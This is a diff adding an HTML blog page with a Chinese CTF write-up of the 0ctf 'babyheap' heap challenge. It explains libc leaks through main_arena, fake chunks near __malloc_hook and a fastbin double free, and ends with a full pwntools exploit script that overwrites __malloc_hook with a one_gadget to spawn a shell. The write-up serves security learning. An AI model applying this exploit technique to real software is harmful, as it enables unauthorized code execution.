@@ -1,0 +1,805 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chtholly1.jpg">
+  <link rel="icon" href="/img/chtholly1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4c81b9">
+  <meta name="author" content="Isolator">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="malloc hook 泄露libc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="malloc hook">
+<meta property="og:url" content="https://isolator-1.github.io/2023/11/04/ctf-pwn/mallochook/index.html">
+<meta property="og:site_name" content="Isolator&#39;s Blog">
+<meta property="og:description" content="malloc hook 泄露libc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/2e4d9896a3691192ef608f635d67cde1.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/f4d73666de533ddaed7caef8222b2ccf.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/e17462f8199dc6d45437fb7e604f6c4b.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/d2c594003ca8f723af882a81bbbe1a68.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/4aa0984ec87d5b2721a1b63d3c0b0c35.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/b9f09f039c80b6c859a240d87234f2ed.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/85331735315afc1ca327cebb35515deb.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/be30a52291628b8928b773d513e70516.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/fde0bcc5e16b386bd5e757816bca0c8e.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/35f83a6472e30559fbcaafe98ab0f101.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/ebc1e7f864fc9b1007afad94f5096a31.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/21336897cb0da16774853f0e20bbefb0.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/3b3ade9638161cf21a58f60c6558832b.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/4d12325def65c8eab07cc7712b394a95.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/aa97c259cc69d78bd91e0337b0db3725.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/530dce4d01190360fdb9f3bcfb99a79c.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/cf295e9198a01c7f4e082b7ccd607e5a.png">
+<meta property="article:published_time" content="2023-11-04T02:42:00.000Z">
+<meta property="article:modified_time" content="2024-07-23T06:12:44.887Z">
+<meta property="article:author" content="Isolator">
+<meta property="article:tag" content="ctf-pwn">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/ctf-pwn/0ctfbabyheap/media/2e4d9896a3691192ef608f635d67cde1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>malloc hook - Isolator&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"isolator-1.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>_φ_(．．) Chtholly Nota Seniorious</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/chtholly2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="malloc hook"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-04 10:42" pubdate>
+          November 4, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          49 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">malloc hook</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="关于什么时候是0x58，什么时候是0x60"><a href="#关于什么时候是0x58，什么时候是0x60" class="headerlink" title="关于什么时候是0x58，什么时候是0x60"></a>关于什么时候是0x58，什么时候是0x60</h3><p>是因为tcache的问题，之前一直都不知道（</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x60</span> <span class="hljs-comment"># tcache</span><br>main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x58</span> <span class="hljs-comment"># no tcache</span><br>main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - offset <span class="hljs-comment"># other condition(not unsorted bin leak)</span><br>malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure>
+
+<h3 id="malloc-hook-0x23"><a href="#malloc-hook-0x23" class="headerlink" title="malloc hook - 0x23"></a>malloc hook - 0x23</h3><p>在malloc hook - 0x23分配fakechunk可以达成size=0x70的检查，因为这个地址上size这里是0x7f，而检查机制不会检查标志位</p>
+<blockquote>
+<p>libc2.31版本中这个位置上的数据已经不再是0x7f</p>
+</blockquote>
+<h3 id="0ctfbabyheap"><a href="#0ctfbabyheap" class="headerlink" title="0ctfbabyheap"></a>0ctfbabyheap</h3><p>首先查看保护，发现全开</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/2e4d9896a3691192ef608f635d67cde1.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后题目里告诉了是2.23版本的libc，先用patchelf换一下libc的位置。</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/f4d73666de533ddaed7caef8222b2ccf.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后打开ida查看漏洞点</p>
+<p>发现问题出在fill函数里，大小是用户输入的，可以溢出</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/e17462f8199dc6d45437fb7e604f6c4b.png" srcset="/img/loading.gif" lazyload></p>
+<p>溢出的结果是可以控制下一个chunk的prevsz和inuse bit，将下一个chunk free之后可以合并前面的free chunk。如果被合并的部分里有可以uaf的部分，就可以泄露unsorted bin的头节点mainarena+88的地址，然后泄露libc基地址。</p>
+<p>然后由于可以修改块的大小，可以通过把chunk从unsorted bin里切分拿出来，造成chunk overlapping，然后就可以绕过题目自带的检查，实施fastbin attack的double free（通过free两个序号不同，但是实际地址相同的chunk），结果就是可以实现伪造chunk中的任意地址写，然后就可以把前面泄露的libc中的one_gadget覆盖到malloc hook地址上，然后下一次malloc的时候就会调用execve(…binsh…)。</p>
+<p>具体调试过程如下：</p>
+<p>首先malloc几个chunk进去，然后free掉前两个</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/d2c594003ca8f723af882a81bbbe1a68.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到大小位0x100的chunk被放到了unsrted bin里，大小为0x80的放在了fastbin里</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/4aa0984ec87d5b2721a1b63d3c0b0c35.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后把0x80的chunk再分配出来，进行溢出到chunk 2</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/b9f09f039c80b6c859a240d87234f2ed.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到下一个chunk被改成了inuse为0的状态，prevsize被修改成了0x180，也就是前面两个chunk合并起来的大小</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/85331735315afc1ca327cebb35515deb.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果这时候free掉chunk2，会把最开头的chunk从unsorted bin里拿出来，与其进行合并，然后合并之后的chunk一起被放在unsorted bin里。由于合并的过程把中间的chunk 1给合并进去了，但是它还是被分配的状态，就可以进行chunk内容的输出泄露。</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/be30a52291628b8928b773d513e70516.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/fde0bcc5e16b386bd5e757816bca0c8e.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/35f83a6472e30559fbcaafe98ab0f101.png" srcset="/img/loading.gif" lazyload></p>
+<p>形成了0x280这个大的chunk中嵌套着一个小的处于被分配的chunk的overlapping。而这个chunk处于0x280这个大块的0x100偏移处，想要通过它打印出来fd和bk要把这个unsorted bin切割一下。</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/ebc1e7f864fc9b1007afad94f5096a31.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/21336897cb0da16774853f0e20bbefb0.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样就有了两个处于完全相同地址上的free、malloc状态的chunk。</p>
+<p>然后dump malloc状态的块，就会把free状态的chunk的fd bk打印出来，而这个fd bk由于unsorted bin里只有这一个chunk节点，fd bk会指向malloc_state结构体里的unsorted bin数组项，对应main_arena+88的位置，根据这个便宜可以确定libc的基地址。</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/3b3ade9638161cf21a58f60c6558832b.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/4d12325def65c8eab07cc7712b394a95.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后需要进行一个fast bin attack的double free，具体过程为：</p>
+<p>free chunk a， free chunk b，free chunk a，malloc chunk a， malloc chunk b， edit chunk a，malloc chunk a，malloc 任意地址的chunk进行edit。</p>
+<p>首先，不连续free a两次的原因是会有检查机制，bins会检查当前链表顶部的chunk的地址和现在free的地址是否相同，相同会被视为double free，但如果中间free了其它chunk，则会绕过这个检查。然后malloc a之后编辑它的fd，下次malloc 的时候自己写入的fd指向的地址会被视为一个chunk，然后malloc出来就可以对其进行写入，完成任意地址写。</p>
+<p>上述流程在这道题里的表述为：</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/aa97c259cc69d78bd91e0337b0db3725.png" srcset="/img/loading.gif" lazyload></p>
+<p>被写入的地方是malloc hook，如果malloc 时这上面的地址不是0，就会执行malloc hook指向的函数。向这个地址写入一段gadget的地址。</p>
+<p>需要说明的点在于one_gadget得到的调用execve binsh的代码</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/530dce4d01190360fdb9f3bcfb99a79c.png" srcset="/img/loading.gif" lazyload></p>
+<p>选用的是第二个0x4526a（这个我不知道为啥大家都用它，其他几个没试过）</p>
+<p>然后通过fast bin attack 就执行了execve，拿到shell</p>
+<p>测试：</p>
+<p>在buuoj上打开这道题，验证了一下exp确实是对的。</p>
+<p><img src="/img/ctf-pwn/0ctfbabyheap/media/cf295e9198a01c7f4e082b7ccd607e5a.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Import pwntools</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># First establish the target process and libc file</span><br>target = process(<span class="hljs-string">&#x27;./0ctfbabyheap&#x27;</span>, env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>&#125;) <span class="hljs-comment"># The ld_preload is used to switch out the libc version we are using</span><br><span class="hljs-comment">#gdb.attach(target)</span><br>elf = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><br><span class="hljs-comment"># Establish the functions to interact with the program</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>	target.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>	target.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>	target.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>	target.sendline(<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index, size, content</span>):<br>	target.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>	target.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>	target.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>	target.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>	target.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>	target.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>	target.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)<br>	target.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>	target.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>	target.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>	target.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>	target.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br>	target.recvuntil(<span class="hljs-string">b&quot;Command&quot;</span>)<br>	target.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>	target.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>	target.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>	target.recvuntil(<span class="hljs-string">b&quot;Content: \n&quot;</span>)<br>	content = target.recvline()<br>	<span class="hljs-keyword">return</span> content<br><br><span class="hljs-comment"># Make the initial four allocations, and fill them with data</span><br>alloc(<span class="hljs-number">0xf0</span>)<span class="hljs-comment"># Chunk 0</span><br>alloc(<span class="hljs-number">0x70</span>)<span class="hljs-comment"># Chunk 1</span><br>alloc(<span class="hljs-number">0xf0</span>)<span class="hljs-comment"># Chunk 2</span><br>alloc(<span class="hljs-number">0x30</span>)<span class="hljs-comment"># Chunk 3</span><br>fill(<span class="hljs-number">0</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">0xf0</span>)<br>fill(<span class="hljs-number">1</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">0x70</span>)<br>fill(<span class="hljs-number">2</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;2&quot;</span>*<span class="hljs-number">0xf0</span>)<br>fill(<span class="hljs-number">3</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">&quot;3&quot;</span>*<span class="hljs-number">0x30</span>)<br><br><span class="hljs-comment"># Free the first two</span><br>free(<span class="hljs-number">0</span>)<span class="hljs-comment"># Chunk 0</span><br>free(<span class="hljs-number">1</span>)<span class="hljs-comment"># Chunk 1</span><br><br><span class="hljs-comment"># Allocate new space where chunk 1 used to be, and overflow chunk chunk 2&#x27;s previous size with 0x180 and the previous in use bit with 0x0 by pushing 0x100</span><br>alloc(<span class="hljs-number">0x78</span>)<span class="hljs-comment"># Chunk 0</span><br>fill(<span class="hljs-number">0</span>, <span class="hljs-number">128</span>, <span class="hljs-string">b&#x27;4&#x27;</span>*<span class="hljs-number">0x70</span> + p64(<span class="hljs-number">0x180</span>) + p64(<span class="hljs-number">0x100</span>))<br><br><span class="hljs-comment"># Free the second chunk, which will bring the edge of the heap before the new chunk 0, thus effictively forgetting about Chunk 0</span><br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Allocate a new chunk that will move the libc address for main_arena+88 into the content </span><br>alloc(<span class="hljs-number">0xf0</span>)<span class="hljs-comment"># Chunk 1</span><br>fill(<span class="hljs-number">1</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&#x27;5&#x27;</span>*<span class="hljs-number">0xf0</span>)<br><br><span class="hljs-comment"># Print the contents of chunk 0, and filter out the main_arena+88 infoleak, and calculate the offsets for everything else</span><br>leak = u64(dump(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>])<br>libc = leak - elf.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x68</span><br>system = libc + <span class="hljs-number">0x4526a</span><br>malloc_hook = libc + elf.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libc + elf.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br>log.info(<span class="hljs-string">&quot;Leak is:        &quot;</span> + <span class="hljs-built_in">hex</span>(leak))<br>log.info(<span class="hljs-string">&quot;System is:      &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>log.info(<span class="hljs-string">&quot;Free hook is:   &quot;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>log.info(<span class="hljs-string">&quot;Malloc hook is: &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>log.info(<span class="hljs-string">&quot;Fake chunk is:  &quot;</span> + <span class="hljs-built_in">hex</span>(fake_chunk))<br>log.info(<span class="hljs-string">&quot;libc is:        &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br><br><span class="hljs-comment"># Free the first chunk to make room for the double free/fastbin duplicaion</span><br>free(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Allocate the next four chunks, chunk 5 will directly overlap with chunk 0 and both chunks will have the same pointer</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment"># Chunk 1</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 2</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 5</span><br><br><span class="hljs-comment"># Commence the double free by freeing 5 then 0, and 4 in between to stop a crash</span><br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># Allocate 2 chunks, fill in the chunk that was freed twice with the fake chunk, allocate that chunk again to add the fake chunk to the free list</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 5</span><br>fill(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, p64(fake_chunk) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">b&#x27;y&#x27;</span>*<span class="hljs-number">0x50</span>)<br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 0</span><br><br><span class="hljs-comment"># Allocate the fake chunk, and write over the malloc hook with the One Shot Gadget</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 6</span><br>fill(<span class="hljs-number">6</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">0x13</span> + p64(system))<br><br><span class="hljs-comment"># Trigger a Malloc call to trigger the malloc hook, and pop a shell</span><br>target.sendline(<span class="hljs-string">b&#x27;1\n1\n&#x27;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br><br><span class="hljs-comment"># Drop to an interactive shell to use the shell</span><br>target.interactive()<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf-pwn/" class="category-chain-item">ctf-pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
+      
+        <a href="/tags/heap/">#heap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>malloc hook</div>
+      <div>https://isolator-1.github.io/2023/11/04/ctf-pwn/mallochook/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Isolator</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
